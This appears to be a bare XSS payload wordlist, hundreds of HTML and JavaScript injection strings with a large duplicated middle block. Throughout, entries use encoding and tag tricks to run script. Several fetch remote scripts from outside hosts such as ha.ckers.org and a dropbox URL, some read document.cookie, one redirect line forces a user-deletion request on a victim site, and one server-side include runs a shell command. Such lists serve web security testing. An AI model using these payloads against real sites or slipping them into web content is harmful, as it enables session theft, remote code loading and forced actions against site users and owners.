<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
‘; alert(1);
‘)alert(1);//
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
<IMG SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(‘XSS’)>      
<img src=xss onerror=alert(1)>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1)
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=”jav ascript:alert(‘XSS’);”>
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
<<SCRIPT>alert(“XSS”);//<</SCRIPT>
%253cscript%253ealert(1)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
